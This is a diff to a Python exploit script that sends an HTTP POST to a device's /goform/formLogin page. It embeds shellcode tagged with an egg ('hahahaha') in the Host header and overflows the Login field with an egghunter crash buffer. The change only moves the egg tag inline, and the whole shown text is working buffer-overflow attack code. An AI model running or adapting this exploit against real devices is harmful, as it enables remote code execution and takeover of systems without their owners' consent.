@@ -43,9 +43,6 @@ rekt += "\x85\x05\x0e\x35\x69\xdc\x8a\x45\x20\x7c\xba\xcd\xed"
 rekt += "\x15\xfe\x93\x0d\xc0\x3d\xaa\x8d\xe0\xbd\x49\x8d\x81"
 rekt += "\xb8\x16\x09\x7a\xb1\x07\xfc\x7c\x66\x27\xd5"
 
-magic = 'hahahaha'
-magic += rekt
-
 egghunter = ''
 egghunter += '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c'
 egghunter += '\x05\x5a\x74\xef\xb8\x68\x61\x68\x61\x8b\xfa\xaf\x75'
@@ -57,7 +54,7 @@ crash += "B" * 20
 crash += egghunter
 
 payload = 'POST /goform/formLogin HTTP/1.1\r\n'
-payload += 'Host: {}\r\n\r\n'.format(magic)
+payload += 'Host: hahahaha{}\r\n\r\n'.format(rekt)
 payload += 'HtmlOnly=true&Login=admin{}&Password=admin&loginButton=Submit+Login'.format(crash)
 
 print('[+] Trying to exploit {}'.format(host))
